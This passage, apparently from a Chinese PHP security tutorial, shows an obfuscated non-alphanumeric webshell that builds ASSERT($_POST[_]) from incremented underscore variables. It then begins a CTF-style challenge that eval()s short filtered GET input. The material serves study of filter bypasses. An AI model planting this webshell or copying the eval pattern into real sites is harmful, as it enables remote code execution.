&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// E 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// R
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// T
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// P
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// O
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// S
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;++&lt;/span&gt;; &lt;span style=&#34;color:#6272a4&#34;&gt;// T
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$____&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$__&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$$____&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$___&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_&lt;/span&gt;[_]); &lt;span style=&#34;color:#6272a4&#34;&gt;// ASSERT($_POST[_]);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;php7动态函数&#34;&gt;php7动态函数&lt;/h2&gt;
&lt;p&gt;看来已经不足以阻挡了.加点难度&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;code&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$code&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;code&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(strlen(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$code&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;35&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Long.&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/[A-Za-z0-9_$]+/&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$code&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;NO.&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;eval&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$code&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    highlight_file(__FILE__);
